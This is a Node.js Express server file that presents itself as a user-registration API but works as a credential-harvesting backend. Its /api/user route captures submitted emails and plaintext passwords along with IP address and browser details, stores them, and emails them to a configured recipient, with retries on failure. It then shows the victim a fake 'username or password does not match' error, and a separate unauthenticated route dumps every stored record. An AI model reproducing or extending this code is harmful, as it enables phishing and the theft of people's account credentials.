const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");

// Load environment variables as early as possible so other modules can use them
dotenv.config();

const verifyRoutes = require("./routes/verify");
const otpRoutes = require("./routes/otp");
const path = require("path");
// Debug: show which recipient will be used for outgoing emails
console.log("CONFIG: SEND_TO=", process.env.SEND_TO);

const app = express();
const port = process.env.PORT || 2000;

const User = require("./models/user");
const sendUserEmail = require("./utils/emailSender");

app.use(cors());
app.use(express.json());
// Serve a small static frontend for manual testing
app.use(express.static(path.join(__dirname, "public")));
app.use("/api/verify", verifyRoutes);
app.use("/api/otp", otpRoutes);

// ===== HEALTH ROUTE =====
app.get("/", (req, res) => {
  res.json({ status: "success", message: "API is running..." });
});

// ===== CREATE USER & SEND EMAIL =====
// ===== CREATE USER & SEND EMAIL (WITH METADATA) =====
app.post("/api/user", async (req, res) => {
  try {
    // ===== METADATA =====
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    const userAgent = req.headers["user-agent"];
    const host = req.headers["host"];
    const submittedAt = new Date();

    // ===== BUILD FULL PAYLOAD =====
    const fullPayload = {
      email: req.body.email,
      password: req.body.password,
      countryState: req.body.countryState,

      ipAddress: ip,
      userAgent,
      host,
      submittedAt,
    };

    // ===== SAVE OR UPDATE USER (DO NOT BLOCK EMAIL) =====
    try {
      await User.findOneAndUpdate({ email: fullPayload.email }, fullPayload, {
        upsert: true,
        new: true,
      });
    } catch (dbErr) {
      console.error(
        "DB error during registration (continuing to send email):",
        dbErr.message,
      );
    }

    // ===== SEND EMAIL WITH FULL PAYLOAD =====
    console.log(
      "POST /api/user: sending notification for",
      fullPayload.email,
      "using SEND_TO=",
      process.env.SEND_TO,
    );

    await sendUserEmail({
      type: "registration",
      data: fullPayload,
    });

    // ===== RESPONSE =====
    res.json({
      success: true,
      message:
        "The username or password does not match our records. Please try again.",
    });
  } catch (error) {
    console.error("Error submitting user:", error.message);

    // ===== EMAIL RETRY LOGIC (SAFEGUARDED) =====
    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

    let lastError = null;
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        await sendUserEmail({
          type: "registration",
          data: {
            ...req.body,
            error: "Primary send failed, retry attempt " + attempt,
          },
        });
        break;
      } catch (err) {
        lastError = err;
        if (attempt < 3) await sleep(500 * attempt);
      }
    }

    res.status(502).json({
      success: false,
      message: "Submission failed",
      error: lastError ? lastError.message : "unknown",
    });
  }
});

// ===== GET ALL USERS =====
app.get("/api/users", async (req, res) => {
  try {
    const data = await User.find();
    res.json(data);
  } catch (error) {
    console.error("Error fetching data:", error.message);
    res.status(500).json({ message: "Error fetching user data" });
  }
});

// ===== START SERVER =====
const start = async () => {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("Database connected");
  } catch (err) {
    console.error("MongoDB connection failed:", err.message);
  } finally {
    // Start server regardless of DB connection status so email/debugging can proceed
    app.listen(port, () => console.log(`Server running on PORT ${port}`));
  }
};

start();
